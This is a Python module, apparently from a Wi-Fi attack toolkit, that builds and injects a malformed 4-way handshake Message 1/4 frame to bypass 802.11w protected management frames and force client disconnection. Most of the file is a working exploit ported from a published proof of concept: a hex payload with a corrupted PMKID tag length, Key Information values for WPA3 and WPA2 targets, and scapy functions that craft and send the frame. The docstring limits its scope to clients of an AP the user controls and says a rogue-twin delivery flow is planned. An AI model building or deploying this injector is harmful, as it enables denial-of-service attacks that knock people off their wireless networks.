"""PMF (Protected Management Frame) bypass via a malformed 4-way handshake
Message 1/4 -- forces client disconnection even when 802.11w would
normally block a plain deauth/disassoc frame.

Ported verbatim from the published FragAttacks-derivative PoC
(domienschepers/wifi-deauthentication, framework/test-deauthentication.py,
PMFDeauthClientPMKIDTagLength) -- a corrupted RSN PMKID tag length (0xff,
underflowing the real tag) in a spoofed Message 1/4 crashes the parsing
logic in some client wpa_supplicant/driver stacks, which disconnects
rather than silently drops the malformed frame. This is an unencrypted
EAPOL-Key frame, not a management frame, so PMF -- which only protects
deauth/disassoc *management* frames -- never gets a chance to block it.
CVE-2025-27558 covers the underlying class of bug.

Scope: this ONLY works against a client already associated to an AP we
control -- the frame has to look like Message 1/4 of that client's own
in-progress or completed handshake with us. It has no effect on a client
connected to someone else's real AP. There is no rogue-AP/PMF-secured-twin
flow in this project yet to deliver it through against a real target
(secure.py's downgrade_twin recommendation is still an unbuilt stub) --
this module is the frame-construction/injection primitive on its own,
ready to be wired into that flow once it exists.
"""

from __future__ import annotations

from scapy.layers.dot11 import Dot11, Dot11QoS, RadioTap
from scapy.layers.l2 import LLC, SNAP
from scapy.packet import Raw
from scapy.sendrecv import sendp


def _inject_radiotap() -> RadioTap:
    """RadioTap header for frames we inject over the air -- ORDER only,
    same reasoning as frames.py's own _inject_radiotap() (not imported
    across the module boundary, matching wps/eap.py's / online.py's
    precedent)."""
    return RadioTap(present="TXFlags", TXFlags="ORDER")

# Exact byte sequence from the published PoC, ported verbatim rather than
# reconstructed field-by-field to avoid transcription errors in a
# security-sensitive payload. {key_info} is the one byte pair the PoC's
# own comment says needs adjusting per target network config. See module
# docstring for provenance.
_CORRUPTED_M1_HEX = (
    "0203007502"
    "{key_info}"
    "001000000000000000"
    "05"
    "00000000000000000000000000000000"
    "00000000000000000000000000000000"
    "00000000000000000000000000000000"
    "00000000000000000000000000000000"
    "00000000000000000000000000000000"
    "0016"
    "dd"
    "ff"
    "000fac04"
    "00000000000000000000000000000000"
)

# Key Information field values the PoC verified/noted, keyed by target
# network config so callers don't have to know the raw hex.
KEY_INFO_WPA3_PMF = "0088"  # verified working by the source PoC
KEY_INFO_WPA2_PMF = "008a"  # per the PoC's own note, untested here


def craft_corrupted_m1(bssid: str, client: str, key_info: str = KEY_INFO_WPA3_PMF):
    """Build the malformed 4-way-handshake Message 1/4 frame (AP -> client).

    key_info: 4-hex-char Key Information field. Use KEY_INFO_WPA3_PMF or
    KEY_INFO_WPA2_PMF, or a raw value if a target needs something else --
    the source PoC notes the underlying bug triggers from an underflow
    in any RSN tag, not just this specific PMKID one.
    """
    dot11 = Dot11(type=2, subtype=8, FCfield="from_DS", addr1=client, addr2=bssid, addr3=bssid)
    eapol_bytes = bytes.fromhex(_CORRUPTED_M1_HEX.format(key_info=key_info))
    return _inject_radiotap() / dot11 / Dot11QoS() / LLC() / SNAP() / Raw(load=eapol_bytes)


def inject_pmf_bypass(iface: str, bssid: str, client: str, key_info: str = KEY_INFO_WPA3_PMF) -> None:
    """Send the malformed Message 1/4 once.

    Caller is responsible for channel placement (radio.ensure_channel)
    and for confirming the client is actually associated to an AP we
    control first -- see module docstring for why this has no effect
    against a client on someone else's real network.
    """
    sendp(craft_corrupted_m1(bssid, client, key_info), iface=iface, verbose=False)
